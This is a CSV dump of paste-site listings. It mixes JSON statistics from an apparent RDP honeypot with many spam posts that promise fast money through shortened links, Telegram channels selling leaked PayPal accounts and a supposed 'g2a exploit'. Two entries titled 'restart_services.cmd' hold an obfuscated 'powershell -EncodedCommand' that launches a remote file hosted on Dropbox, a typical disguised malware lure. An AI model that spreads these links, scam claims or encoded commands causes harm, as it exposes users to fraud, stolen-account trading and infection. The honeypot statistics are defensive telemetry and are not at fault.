id,title,username,language,date,content
2xWPCfUA,2025-05-11_stats.json,rdp_snitch,JSON,Sunday 11th of May 2025 07:18:35 PM CDT,"{
  ""ip"": {
    ""41.33.88.113"": 15,
    ""128.199.248.18"": 4470,
    ""167.99.10.7"": 5793,
    ""128.199.168.88"": 3936,
    ""128.199.166.57"": 3711,
    ""157.245.150.219"": 7590,
    ""45.117.177.2"": 705,
    ""80.94.95.198"": 21,
    ""188.124.248.38"": 3,
    ""111.89.163.100"": 6,
    ""45.227.254.130"": 9,
    ""123.103.219.70"": 9,
    ""176.57.188.115"": 3,
    ""71.82.170.60"": 6,
    ""185.8.62.6"": 2679,
    ""198.235.24.69"": 9,
    ""160.30.44.131"": 12,
    ""75.34.67.3"": 6,
    ""80.94.95.203"": 6,
    ""157.245.104.150"": 21,
    ""48.216.243.126"": 3,
    ""91.238.181.95"": 6,
    ""165.232.167.86"": 3,
    ""45.227.254.152"": 6,
    ""185.196.220.41"": 9,
    ""104.131.107.81"": 39,
    ""5.178.1.30"": 3,
    ""198.235.24.123"": 9,
    ""85.208.84.135"": 6,
    ""85.208.84.130"": 6,
    ""167.94.146.50"": 3,
    ""102.88.21.219"": 3,
    ""95.179.246.240"": 6,
    ""147.185.132.87"": 9,
    ""185.209.49.162"": 3,
    ""47.252.113.102"": 3,
    ""146.190.242.181"": 5793,
    ""209.97.169.106"": 156,
    ""128.22.147.233"": 3,
    ""152.32.157.92"": 3,
    ""183.136.197.62"": 3,
    ""147.185.132.15"": 9
  },
  ""asn"": {
    ""AS8452"": 15,
    ""AS14061"": 31512,
    ""AS131353"": 705,
    ""AS204428"": 27,
    ""AS201776"": 3,
    ""AS2514"": 6,
    ""AS267784"": 15,
    ""AS4826"": 9,
    ""AS51167"": 3,
    ""AS20115"": 6,
    ""AS58269"": 2679,
    ""AS396982"": 36,
    ""AS152963"": 12,
    ""AS7018"": 6,
    ""AS8075"": 3,
    ""AS49434"": 6,
    ""AS208046"": 9,
    ""AS211059"": 3,
    ""AS34665"": 12,
    ""AS398705"": 3,
    ""AS29465"": 3,
    ""AS20473"": 6,
    ""AS44578"": 3,
    ""AS45102"": 3,
    ""AS17511"": 3,
    ""AS135377"": 3,
    ""AS4134"": 3
  },
  ""isp"": {
    ""TE Data"": 15,
    ""DigitalOcean, LLC"": 31512,
    ""NHANHOA"": 705,
    ""SS-Net"": 27,
    ""Miranda-Media Ltd"": 3,
    ""NTT PC Communications, Inc."": 6,
    ""Flyservers S.A."": 15,
    ""Vocus PTY LTD"": 9,
    ""Contabo GmbH"": 3,
    ""Charter Communications"": 6,
    ""CloudHosting Data Center"": 2679,
    ""Google LLC"": 36,
    ""Phuong Nam Company Limited"": 12,
    ""AT&T Enterprises, LLC"": 6,
    ""Microsoft Corporation"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""ColocationX Ltd."": 9,
    ""Tribeka Web Advisors S.A."": 3,
    ""Petersburg Internet Network ltd."": 12,
    ""Censys, Inc."": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""The Constant Company, LLC"": 6,
    ""Itglobal COM Dmcc"": 3,
    ""Alibaba Cloud LLC"": 3,
    ""OPTAGE Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chinanet"": 3
  },
  ""org"": {
    ""Unknown"": 15,
    ""DigitalOcean, LLC"": 25680,
    ""Digital Ocean"": 5832,
    ""Branch of Nhan Hoa Software Company"": 705,
    ""Unmanaged LTD"": 27,
    ""Miranda-Media Ltd"": 3,
    ""InfoSphere"": 6,
    ""Xwin Universal LTD"": 15,
    ""Vocus Communications"": 9,
    ""Contabo GmbH"": 3,
    ""Spectrum"": 6,
    ""CloudHosting SIA"": 2679,
    ""Palo Alto Networks, Inc"": 36,
    ""Phuong Nam Company Limited"": 12,
    ""PPPoX Pool - rback4.spfdmo"": 6,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""ColocationX Ltd"": 9,
    ""Tribeka Web Advisors S.A"": 3,
    ""IT Hostline Ltd"": 12,
    ""Censys, Inc."": 3,
    ""MTN Nigeria"": 3,
    ""Vultr Holdings LLC Frankfurt"": 6,
    ""Itglobal COM Dmcc"": 3,
    ""Alibaba Cloud - US"": 3,
    ""OPTAGE Inc."": 3,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Ningbo Xuezhongpeng Person"": 3
  },
  ""regionName"": {
    ""Dakahlia"": 15,
    ""Florida"": 4470,
    ""New Jersey"": 5832,
    ""South West"": 15396,
    ""Ho Chi Minh"": 717,
    ""Budapest"": 27,
    ""Crimea"": 3,
    ""Tokyo"": 6,
    ""Vilnius"": 15,
    ""Western Australia"": 9,
    ""North Rhine-Westphalia"": 3,
    ""Wisconsin"": 6,
    ""R\u012bga"": 2679,
    ""California"": 36,
    ""Alabama"": 6,
    ""Karnataka"": 21,
    ""Virginia"": 15,
    ""\u00cele-de-France"": 6,
    ""Mariehamns stad"": 3,
    ""Moscow"": 12,
    ""Hesse"": 9,
    ""Lagos"": 3,
    ""Dubai"": 3,
    ""Ontario"": 5793,
    ""Osaka"": 3,
    ""England"": 3,
    ""Zhejiang"": 3
  },
  ""country"": {
    ""Egypt"": 15,
    ""United States"": 10365,
    ""Singapore"": 15396,
    ""Vietnam"": 717,
    ""Hungary"": 27,
    ""Ukraine"": 3,
    ""Japan"": 9,
    ""Lithuania"": 15,
    ""Australia"": 9,
    ""Germany"": 12,
    ""Latvia"": 2679,
    ""India"": 21,
    ""France"": 6,
    ""Aland Islands"": 3,
    ""Russia"": 12,
    ""Nigeria"": 3,
    ""United Arab Emirates"": 3,
    ""Canada"": 5793,
    ""United Kingdom"": 3,
    ""China"": 3
  },
  ""account"": {
    ""142.93.8.59"": 60,
    ""hello"": 34935,
    ""a"": 3,
    ""Domain"": 18,
    ""dWvmSPsbh"": 3,
    ""GVIoDa"": 3,
    ""aqbfLM"": 3,
    ""Administr"": 21,
    ""Test"": 12,
    ""KixVLh"": 3,
    ""rVrukmfJz"": 3,
    ""jyuQRT"": 3,
    ""(empty)"": 3,
    ""LCYhcIRph"": 3,
    ""YxIZkp"": 3,
    ""YesOFR"": 3,
    ""Administrator"": 3,
    ""--"": 3,
    ""hNquJetzF"": 3,
    ""ROmlWm"": 3,
    ""yhGJeB"": 3
  },
  ""keyboard"": {
    ""Unknown"": 35094
  },
  ""client_build"": {
    ""Unknown"": 35094
  },
  ""client_name"": {
    ""Unknown"": 35094
  },
  ""ip_type"": {
    ""Unknown"": 135,
    ""hosting"": 29139,
    ""hosting & proxy"": 5817,
    ""mobile & hosting"": 3
  }
}"
Su7HW9tw,2025-05-09T17:57:32.354182 00,lenurb,JavaScript,Sunday 11th of May 2025 07:18:31 PM CDT,354959 - check it out at https://tinyurl.com/48rykfr6
nSBi2aUJ,Test roblox v3 27,Personal_Toolkit,JavaScript,Sunday 11th of May 2025 07:17:29 PM CDT,918910 - check it out at https://tinyurl.com/mpghpdf
1XhWzkGy,⭐️Earn $2000 a Month [EASY GUIDE]  ND,MEDI_YOUTUBE,JavaScript,Sunday 11th of May 2025 07:17:28 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

J1vxHfCDu0
"
1W4cStpx,??Make 2000$+ daily together B 10,jose20david,JavaScript,Sunday 11th of May 2025 07:17:02 PM CDT,252570 - check it out at https://tinyurl.com/v18latest
rCexNk6w,2025-05-11_stats.json,rdp_snitch,JSON,Sunday 11th of May 2025 07:16:17 PM CDT,"{
  ""ip"": {
    ""41.33.88.113"": 10,
    ""128.199.248.18"": 2980,
    ""167.99.10.7"": 3862,
    ""128.199.168.88"": 2624,
    ""128.199.166.57"": 2474,
    ""157.245.150.219"": 5060,
    ""45.117.177.2"": 470,
    ""80.94.95.198"": 14,
    ""188.124.248.38"": 2,
    ""111.89.163.100"": 4,
    ""45.227.254.130"": 6,
    ""123.103.219.70"": 6,
    ""176.57.188.115"": 2,
    ""71.82.170.60"": 4,
    ""185.8.62.6"": 1786,
    ""198.235.24.69"": 6,
    ""160.30.44.131"": 8,
    ""75.34.67.3"": 4,
    ""80.94.95.203"": 4,
    ""157.245.104.150"": 14,
    ""48.216.243.126"": 2,
    ""91.238.181.95"": 4,
    ""165.232.167.86"": 2,
    ""45.227.254.152"": 4,
    ""185.196.220.41"": 6,
    ""104.131.107.81"": 26,
    ""5.178.1.30"": 2,
    ""198.235.24.123"": 6,
    ""85.208.84.135"": 4,
    ""85.208.84.130"": 4,
    ""167.94.146.50"": 2,
    ""102.88.21.219"": 2,
    ""95.179.246.240"": 4,
    ""147.185.132.87"": 6,
    ""185.209.49.162"": 2,
    ""47.252.113.102"": 2,
    ""146.190.242.181"": 3862,
    ""209.97.169.106"": 104,
    ""128.22.147.233"": 2,
    ""152.32.157.92"": 2,
    ""183.136.197.62"": 2,
    ""147.185.132.15"": 6
  },
  ""asn"": {
    ""AS8452"": 10,
    ""AS14061"": 21008,
    ""AS131353"": 470,
    ""AS204428"": 18,
    ""AS201776"": 2,
    ""AS2514"": 4,
    ""AS267784"": 10,
    ""AS4826"": 6,
    ""AS51167"": 2,
    ""AS20115"": 4,
    ""AS58269"": 1786,
    ""AS396982"": 24,
    ""AS152963"": 8,
    ""AS7018"": 4,
    ""AS8075"": 2,
    ""AS49434"": 4,
    ""AS208046"": 6,
    ""AS211059"": 2,
    ""AS34665"": 8,
    ""AS398705"": 2,
    ""AS29465"": 2,
    ""AS20473"": 4,
    ""AS44578"": 2,
    ""AS45102"": 2,
    ""AS17511"": 2,
    ""AS135377"": 2,
    ""AS4134"": 2
  },
  ""isp"": {
    ""TE Data"": 10,
    ""DigitalOcean, LLC"": 21008,
    ""NHANHOA"": 470,
    ""SS-Net"": 18,
    ""Miranda-Media Ltd"": 2,
    ""NTT PC Communications, Inc."": 4,
    ""Flyservers S.A."": 10,
    ""Vocus PTY LTD"": 6,
    ""Contabo GmbH"": 2,
    ""Charter Communications"": 4,
    ""CloudHosting Data Center"": 1786,
    ""Google LLC"": 24,
    ""Phuong Nam Company Limited"": 8,
    ""AT&T Enterprises, LLC"": 4,
    ""Microsoft Corporation"": 2,
    ""Datacenter location PAR1 France"": 4,
    ""ColocationX Ltd."": 6,
    ""Tribeka Web Advisors S.A."": 2,
    ""Petersburg Internet Network ltd."": 8,
    ""Censys, Inc."": 2,
    ""MTN NIGERIA Communication limited"": 2,
    ""The Constant Company, LLC"": 4,
    ""Itglobal COM Dmcc"": 2,
    ""Alibaba Cloud LLC"": 2,
    ""OPTAGE Inc."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Chinanet"": 2
  },
  ""org"": {
    ""Unknown"": 10,
    ""DigitalOcean, LLC"": 17120,
    ""Digital Ocean"": 3888,
    ""Branch of Nhan Hoa Software Company"": 470,
    ""Unmanaged LTD"": 18,
    ""Miranda-Media Ltd"": 2,
    ""InfoSphere"": 4,
    ""Xwin Universal LTD"": 10,
    ""Vocus Communications"": 6,
    ""Contabo GmbH"": 2,
    ""Spectrum"": 4,
    ""CloudHosting SIA"": 1786,
    ""Palo Alto Networks, Inc"": 24,
    ""Phuong Nam Company Limited"": 8,
    ""PPPoX Pool - rback4.spfdmo"": 4,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""ColocationX Ltd"": 6,
    ""Tribeka Web Advisors S.A"": 2,
    ""IT Hostline Ltd"": 8,
    ""Censys, Inc."": 2,
    ""MTN Nigeria"": 2,
    ""Vultr Holdings LLC Frankfurt"": 4,
    ""Itglobal COM Dmcc"": 2,
    ""Alibaba Cloud - US"": 2,
    ""OPTAGE Inc."": 2,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Ningbo Xuezhongpeng Person"": 2
  },
  ""regionName"": {
    ""Dakahlia"": 10,
    ""Florida"": 2980,
    ""New Jersey"": 3888,
    ""South West"": 10264,
    ""Ho Chi Minh"": 478,
    ""Budapest"": 18,
    ""Crimea"": 2,
    ""Tokyo"": 4,
    ""Vilnius"": 10,
    ""Western Australia"": 6,
    ""North Rhine-Westphalia"": 2,
    ""Wisconsin"": 4,
    ""R\u012bga"": 1786,
    ""California"": 24,
    ""Alabama"": 4,
    ""Karnataka"": 14,
    ""Virginia"": 10,
    ""\u00cele-de-France"": 4,
    ""Mariehamns stad"": 2,
    ""Moscow"": 8,
    ""Hesse"": 6,
    ""Lagos"": 2,
    ""Dubai"": 2,
    ""Ontario"": 3862,
    ""Osaka"": 2,
    ""England"": 2,
    ""Zhejiang"": 2
  },
  ""country"": {
    ""Egypt"": 10,
    ""United States"": 6910,
    ""Singapore"": 10264,
    ""Vietnam"": 478,
    ""Hungary"": 18,
    ""Ukraine"": 2,
    ""Japan"": 6,
    ""Lithuania"": 10,
    ""Australia"": 6,
    ""Germany"": 8,
    ""Latvia"": 1786,
    ""India"": 14,
    ""France"": 4,
    ""Aland Islands"": 2,
    ""Russia"": 8,
    ""Nigeria"": 2,
    ""United Arab Emirates"": 2,
    ""Canada"": 3862,
    ""United Kingdom"": 2,
    ""China"": 2
  },
  ""account"": {
    ""142.93.8.59"": 40,
    ""hello"": 23290,
    ""a"": 2,
    ""Domain"": 12,
    ""dWvmSPsbh"": 2,
    ""GVIoDa"": 2,
    ""aqbfLM"": 2,
    ""Administr"": 14,
    ""Test"": 8,
    ""KixVLh"": 2,
    ""rVrukmfJz"": 2,
    ""jyuQRT"": 2,
    ""(empty)"": 2,
    ""LCYhcIRph"": 2,
    ""YxIZkp"": 2,
    ""YesOFR"": 2,
    ""Administrator"": 2,
    ""--"": 2,
    ""hNquJetzF"": 2,
    ""ROmlWm"": 2,
    ""yhGJeB"": 2
  },
  ""keyboard"": {
    ""Unknown"": 23396
  },
  ""client_build"": {
    ""Unknown"": 23396
  },
  ""client_name"": {
    ""Unknown"": 23396
  },
  ""ip_type"": {
    ""Unknown"": 90,
    ""hosting"": 19426,
    ""hosting & proxy"": 3878,
    ""mobile & hosting"": 2
  }
}"
NCfHmTaR,??Earn $2000 a Month From Home C 55,bitus,JavaScript,Sunday 11th of May 2025 07:15:59 PM CDT,358959 - check it out at https://tinyurl.com/yc4w4vys
N0V8T00X,??Earn $2000 a Month From Home C 12,lenurb,JavaScript,Sunday 11th of May 2025 07:15:30 PM CDT,848129 - check it out at https://tinyurl.com/48rykfr6
fEgLKVB3,2025-05-11_stats.json,rdp_snitch,JSON,Sunday 11th of May 2025 07:15:10 PM CDT,"{
  ""ip"": {
    ""41.33.88.113"": 5,
    ""128.199.248.18"": 1490,
    ""167.99.10.7"": 1931,
    ""128.199.168.88"": 1312,
    ""128.199.166.57"": 1237,
    ""157.245.150.219"": 2530,
    ""45.117.177.2"": 235,
    ""80.94.95.198"": 7,
    ""188.124.248.38"": 1,
    ""111.89.163.100"": 2,
    ""45.227.254.130"": 3,
    ""123.103.219.70"": 3,
    ""176.57.188.115"": 1,
    ""71.82.170.60"": 2,
    ""185.8.62.6"": 893,
    ""198.235.24.69"": 3,
    ""160.30.44.131"": 4,
    ""75.34.67.3"": 2,
    ""80.94.95.203"": 2,
    ""157.245.104.150"": 7,
    ""48.216.243.126"": 1,
    ""91.238.181.95"": 2,
    ""165.232.167.86"": 1,
    ""45.227.254.152"": 2,
    ""185.196.220.41"": 3,
    ""104.131.107.81"": 13,
    ""5.178.1.30"": 1,
    ""198.235.24.123"": 3,
    ""85.208.84.135"": 2,
    ""85.208.84.130"": 2,
    ""167.94.146.50"": 1,
    ""102.88.21.219"": 1,
    ""95.179.246.240"": 2,
    ""147.185.132.87"": 3,
    ""185.209.49.162"": 1,
    ""47.252.113.102"": 1,
    ""146.190.242.181"": 1931,
    ""209.97.169.106"": 52,
    ""128.22.147.233"": 1,
    ""152.32.157.92"": 1,
    ""183.136.197.62"": 1,
    ""147.185.132.15"": 3
  },
  ""asn"": {
    ""AS8452"": 5,
    ""AS14061"": 10504,
    ""AS131353"": 235,
    ""AS204428"": 9,
    ""AS201776"": 1,
    ""AS2514"": 2,
    ""AS267784"": 5,
    ""AS4826"": 3,
    ""AS51167"": 1,
    ""AS20115"": 2,
    ""AS58269"": 893,
    ""AS396982"": 12,
    ""AS152963"": 4,
    ""AS7018"": 2,
    ""AS8075"": 1,
    ""AS49434"": 2,
    ""AS208046"": 3,
    ""AS211059"": 1,
    ""AS34665"": 4,
    ""AS398705"": 1,
    ""AS29465"": 1,
    ""AS20473"": 2,
    ""AS44578"": 1,
    ""AS45102"": 1,
    ""AS17511"": 1,
    ""AS135377"": 1,
    ""AS4134"": 1
  },
  ""isp"": {
    ""TE Data"": 5,
    ""DigitalOcean, LLC"": 10504,
    ""NHANHOA"": 235,
    ""SS-Net"": 9,
    ""Miranda-Media Ltd"": 1,
    ""NTT PC Communications, Inc."": 2,
    ""Flyservers S.A."": 5,
    ""Vocus PTY LTD"": 3,
    ""Contabo GmbH"": 1,
    ""Charter Communications"": 2,
    ""CloudHosting Data Center"": 893,
    ""Google LLC"": 12,
    ""Phuong Nam Company Limited"": 4,
    ""AT&T Enterprises, LLC"": 2,
    ""Microsoft Corporation"": 1,
    ""Datacenter location PAR1 France"": 2,
    ""ColocationX Ltd."": 3,
    ""Tribeka Web Advisors S.A."": 1,
    ""Petersburg Internet Network ltd."": 4,
    ""Censys, Inc."": 1,
    ""MTN NIGERIA Communication limited"": 1,
    ""The Constant Company, LLC"": 2,
    ""Itglobal COM Dmcc"": 1,
    ""Alibaba Cloud LLC"": 1,
    ""OPTAGE Inc."": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Chinanet"": 1
  },
  ""org"": {
    ""Unknown"": 5,
    ""DigitalOcean, LLC"": 8560,
    ""Digital Ocean"": 1944,
    ""Branch of Nhan Hoa Software Company"": 235,
    ""Unmanaged LTD"": 9,
    ""Miranda-Media Ltd"": 1,
    ""InfoSphere"": 2,
    ""Xwin Universal LTD"": 5,
    ""Vocus Communications"": 3,
    ""Contabo GmbH"": 1,
    ""Spectrum"": 2,
    ""CloudHosting SIA"": 893,
    ""Palo Alto Networks, Inc"": 12,
    ""Phuong Nam Company Limited"": 4,
    ""PPPoX Pool - rback4.spfdmo"": 2,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""ColocationX Ltd"": 3,
    ""Tribeka Web Advisors S.A"": 1,
    ""IT Hostline Ltd"": 4,
    ""Censys, Inc."": 1,
    ""MTN Nigeria"": 1,
    ""Vultr Holdings LLC Frankfurt"": 2,
    ""Itglobal COM Dmcc"": 1,
    ""Alibaba Cloud - US"": 1,
    ""OPTAGE Inc."": 1,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Ningbo Xuezhongpeng Person"": 1
  },
  ""regionName"": {
    ""Dakahlia"": 5,
    ""Florida"": 1490,
    ""New Jersey"": 1944,
    ""South West"": 5132,
    ""Ho Chi Minh"": 239,
    ""Budapest"": 9,
    ""Crimea"": 1,
    ""Tokyo"": 2,
    ""Vilnius"": 5,
    ""Western Australia"": 3,
    ""North Rhine-Westphalia"": 1,
    ""Wisconsin"": 2,
    ""R\u012bga"": 893,
    ""California"": 12,
    ""Alabama"": 2,
    ""Karnataka"": 7,
    ""Virginia"": 5,
    ""\u00cele-de-France"": 2,
    ""Mariehamns stad"": 1,
    ""Moscow"": 4,
    ""Hesse"": 3,
    ""Lagos"": 1,
    ""Dubai"": 1,
    ""Ontario"": 1931,
    ""Osaka"": 1,
    ""England"": 1,
    ""Zhejiang"": 1
  },
  ""country"": {
    ""Egypt"": 5,
    ""United States"": 3455,
    ""Singapore"": 5132,
    ""Vietnam"": 239,
    ""Hungary"": 9,
    ""Ukraine"": 1,
    ""Japan"": 3,
    ""Lithuania"": 5,
    ""Australia"": 3,
    ""Germany"": 4,
    ""Latvia"": 893,
    ""India"": 7,
    ""France"": 2,
    ""Aland Islands"": 1,
    ""Russia"": 4,
    ""Nigeria"": 1,
    ""United Arab Emirates"": 1,
    ""Canada"": 1931,
    ""United Kingdom"": 1,
    ""China"": 1
  },
  ""account"": {
    ""142.93.8.59"": 20,
    ""hello"": 11645,
    ""a"": 1,
    ""Domain"": 6,
    ""dWvmSPsbh"": 1,
    ""GVIoDa"": 1,
    ""aqbfLM"": 1,
    ""Administr"": 7,
    ""Test"": 4,
    ""KixVLh"": 1,
    ""rVrukmfJz"": 1,
    ""jyuQRT"": 1,
    ""(empty)"": 1,
    ""LCYhcIRph"": 1,
    ""YxIZkp"": 1,
    ""YesOFR"": 1,
    ""Administrator"": 1,
    ""--"": 1,
    ""hNquJetzF"": 1,
    ""ROmlWm"": 1,
    ""yhGJeB"": 1
  },
  ""keyboard"": {
    ""Unknown"": 11698
  },
  ""client_build"": {
    ""Unknown"": 11698
  },
  ""client_name"": {
    ""Unknown"": 11698
  },
  ""ip_type"": {
    ""Unknown"": 45,
    ""hosting"": 9713,
    ""hosting & proxy"": 1939,
    ""mobile & hosting"": 1
  }
}"
NUaPjScR,⭐️500 EUR BALANCE METHOD ⭐️,robloxhack212,JavaScript,Sunday 11th of May 2025 07:14:52 PM CDT,"45811 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
whzF8LJ3,Black Hole optimization v2 (181 nodes) 92,Personal_Toolkit,JavaScript,Sunday 11th of May 2025 07:14:28 PM CDT,050694 - check it out at https://tinyurl.com/mpghpdf
CuAXzNLb,⭐️EARN $500 INSTANTLY⭐ CW,MEDI_YOUTUBE,JavaScript,Sunday 11th of May 2025 07:14:18 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

EWDCrtZGwU
"
mqCf1y3A,PayPal with Balance,Xp_Isolation,JavaScript,Sunday 11th of May 2025 07:14:12 PM CDT,77488 Accounts Posted On https://t.me/leakzbyeminem
HAaQWiJz,??Make $3000 in 24 hours W7 22,jose20david,JavaScript,Sunday 11th of May 2025 07:14:00 PM CDT,433909 - check it out at https://tinyurl.com/v18latest
F08tbNJN,??Make 2000$+ daily together B 94,bitus,JavaScript,Sunday 11th of May 2025 07:12:58 PM CDT,555570 - check it out at https://tinyurl.com/yc4w4vys
UCgkuhzr,restart_services.cmd 52,Mikeberyl,JavaScript,Sunday 11th of May 2025 07:12:09 PM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBhADQAZgBhADgANwBmAGIA
V7Aj15SM,⭐️Make $3000 in Month [BTC]  KR,zak8203,JavaScript,Sunday 11th of May 2025 07:11:10 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

m9LQKTKgpi
"
KX6xPSjA,Test roblox v3 38,jose20david,JavaScript,Sunday 11th of May 2025 07:10:59 PM CDT,489601 - check it out at https://tinyurl.com/v18latest
2Kbvtzku,⭐️ Make $2000 Daily ⭐️,robloxhack212,JavaScript,Sunday 11th of May 2025 07:10:49 PM CDT,"71013 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
TS7enDVW,Black Hole optimization v2 (181 nodes) 96,bitus,JavaScript,Sunday 11th of May 2025 07:09:56 PM CDT,533103 - check it out at https://tinyurl.com/yc4w4vys
zUGBWBBr,restart_services.cmd 01,Mikeberyl,JavaScript,Sunday 11th of May 2025 07:08:37 PM CDT, - check it out at powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBkAGMAMgA5AGQANgBjADEA
h9JyAZQP,??Make 2000$+ daily together B 41,jose20david,JavaScript,Sunday 11th of May 2025 07:07:57 PM CDT,535241 - check it out at https://tinyurl.com/v18latest
